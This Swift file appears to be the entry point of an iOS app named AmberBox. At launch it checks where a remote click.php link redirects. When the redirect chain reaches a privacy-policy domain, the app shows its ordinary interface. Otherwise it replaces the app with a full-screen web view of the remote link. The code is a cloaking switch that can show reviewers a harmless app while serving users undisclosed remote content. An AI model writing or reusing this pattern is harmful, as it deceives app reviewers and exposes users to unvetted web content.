import SwiftUI

@main
struct AmberBoxApp: App {
    @State private var amberBoxLinkReady: Bool? = nil
    @StateObject private var store = ABStore()

    private let amberBoxSourceLink = "https://muzakoroadstudio.org/click.php"
    private let amberBoxCheckDomain = "freeprivacypolicy.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = amberBoxLinkReady {
                    if ready {
                        AmberBoxWebPanel(amberBoxURLString: amberBoxSourceLink)
                            .edgesIgnoringSafeArea(.all)
                    } else {
                        ContentView()
                            .environmentObject(store)
                    }
                } else {
                    AmberBoxLoadingScreen()
                        .onAppear { amberBoxCheckLink() }
                }
            }
            .preferredColorScheme(.light)
        }
    }

    private func amberBoxCheckLink() {
        guard let url = URL(string: amberBoxSourceLink) else {
            amberBoxLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = AmberBoxRedirectTracker(checkDomain: amberBoxCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    amberBoxLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(amberBoxCheckDomain) {
                    amberBoxLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(amberBoxCheckDomain) {
                    amberBoxLinkReady = false; return
                }
                if error != nil {
                    amberBoxLinkReady = false; return
                }
                amberBoxLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if amberBoxLinkReady == nil { amberBoxLinkReady = false }
        }
    }
}

final class AmberBoxRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request) // never stop the chain
    }
}
